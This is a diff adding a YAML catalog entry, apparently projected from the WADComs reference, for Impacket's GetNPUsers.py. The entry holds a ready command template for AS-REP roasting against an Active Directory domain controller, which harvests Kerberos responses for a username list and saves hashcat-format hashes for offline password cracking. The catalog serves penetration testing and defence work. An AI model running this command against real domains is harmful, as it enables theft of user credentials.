@@ -1,0 +1,79 @@
+id: wadcoms/Impacket-GetNPUsers
+type: technique
+platform: active-directory
+name: Impacket GetNPUsers
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- a valid username
+commands:
+- template: python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat
+    -outputfile hashes.txt
+  comment: "Impacket's GetNPUsers.py will attempt to harvest the non-preauth AS_REP responses for a given\
+    \ list of usernames. These responses will be encrypted with the user's password, which can then be\
+    \ cracked offline.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\t\
+    Username List: usernames.txt\n\n\tOutput File: hashes.txt\n"
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
+- https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+tags:
+- active-directory
+- wadcoms
+- kerberos
+source_data:
+  WADComs:
+    raw:
+      file: Impacket-GetNPUsers.md
+      document: "---\ndescription: |\n  Impacket's GetNPUsers.py will attempt to harvest the non-preauth\
+        \ AS_REP responses for a given list of usernames. These responses will be encrypted with the user's\
+        \ password, which can then be cracked offline.\n\n  Command Reference:\n\n  \tTarget IP: 10.10.10.1\n\
+        \n  \tDomain: test.local\n\n  \tUsername List: usernames.txt\n\n  \tOutput File: hashes.txt\n\n\
+        command: |\n  python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format\
+        \ hashcat -outputfile hashes.txt\nitems:\n  - Username\nservices:\n  - Kerberos\nOS:\n  - Linux\n\
+        \  - Windows\nattack_types:\n  - Exploitation\nreferences:\n  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py\n\
+        \  - https://www.tarlogic.com/en/blog/how-to-attack-kerberos/\n---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:dbd688805841e4ad7970dc99e4f38cdeafea9aaaf7762dd2d3c278eaa0d63203
